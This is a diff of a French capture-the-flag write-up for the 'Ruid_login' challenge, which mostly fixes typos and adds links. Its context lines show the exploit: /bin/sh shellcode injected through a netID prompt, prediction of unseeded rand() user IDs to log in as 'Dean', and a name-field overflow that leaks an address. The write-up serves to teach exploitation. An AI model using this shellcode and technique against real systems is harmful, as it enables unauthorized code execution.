@@ -5,10 +5,11 @@ title = 'Ruid_login'
 +++
 
 <div class="attachments">
-  <a href="/ctf/scarletctf_01_26/ruid_login/rand">rand</a>
-  <a href="/ctf/scarletctf_01_26/ruid_login/rand.c">rand.c</a>
-  <a href="/ctf/scarletctf_01_26/ruid_login/ruid_login">ruid_login</a>
-  <a href="/ctf/scarletctf_01_26/ruid_login/solve.py">solve.py</a>
+  <a href="/ctf/scarletctf_01_26">Scarlet CTF</a><br><br>
+  <a href="/ctf/scarletctf_01_26/ruid_login/rand">rand</a><br>
+  <a href="/ctf/scarletctf_01_26/ruid_login/rand.c">rand.c</a><br>
+  <a href="/ctf/scarletctf_01_26/ruid_login/ruid_login">ruid_login</a><br>
+  <a href="/ctf/scarletctf_01_26/ruid_login/solve.py">solve.py</a><br>
 </div>
 
 # Scarlet CTF
@@ -50,7 +51,7 @@ undefined8 main(void)
   while( true ) {
     list_ruids();
     printf("Please enter your RUID: ");
-    // pas de problèmes sur le scnaf non plus
+    // pas de problèmes sur le scanf non plus
     __isoc23_scanf("%lu%*c",&ruid);
     printf("Logging in as RUID %lu..\n",ruid);
     for (i = 0; i < 2; i = i + 1) {
@@ -61,7 +62,7 @@ undefined8 main(void)
     }
 ```
 
-Le programme commence par nous demander un netID qui à l'air de ne servir absolument à rien, nous allons mettre notre shellcode ici
+Le programme commence par nous demander un netID qui a l'air de ne servir absolument à rien, nous allons mettre notre shellcode ici.
 
 ```python
 from pwn import *
@@ -72,9 +73,9 @@ shellcode = b"\x48\xb8\x2f\x62\x69\x6e\x2f\x73\x68\x00\x50\x54\x5f\x31\xc0\x50\x
 io.sendlineafter(b"your netID", shellcode)
 ```
 
-Suite à quoi on peut se 'connnecter' en tant qu'utilisateurs si on connait leur RUID, et le programme executera la fonction associée à cet utilisateur
+Suite à quoi on peut se 'connnecter' en tant qu'un utilisateur si on connait son RUID, et le programme executera la fonction associée à cet utilisateur.
 
-Ces utilisateurs sont initialisés dans la fonction 'setup_users'
+Ces utilisateurs sont initialisés dans la fonction 'setup_users' :
 
 ```C
 void setup_users(void)
@@ -97,7 +98,7 @@ void setup_users(void)
 }
 ```
 
-On voit que leur ruid est généré avec rand() sans seed, ce seront donc toujours les mêmes, calculons les à l'avance
+On voit que leur ruid est généré avec rand() sans seed, ce seront donc toujours les mêmes, calculons les à l'avance :
 
 ```C
 #include <unistd.h>
@@ -115,7 +116,7 @@ int main(){
 846930886
 ```
 
-On peut maintenant se connecter en tant que 'Professor' ou 'Dean' et executer leurs fonctions
+On peut maintenant se connecter en tant que 'Professor' ou 'Dean' et executer leurs fonctions.
 
 celle du prof n'est pas interessante en revanche celle de dean :
 ```C
@@ -164,10 +165,10 @@ et les structures resemblent maintenant à:
 ```python
 # connect as dean
 io.sendlineafter(b"your RUID", b"846930886")
-#change prof name
+# change prof name
 io.sendlineafter(b"Num:", b"0")
 io.sendlineafter(b"New name:", b"a"*0x20)
-#receive the leak
+# receive the leak
 io.recvuntil(b"a"*0x20)
 leak = io.recv(6)
 leak = u64(b"\xf3" + leak[1:] + b"\x00"*2)
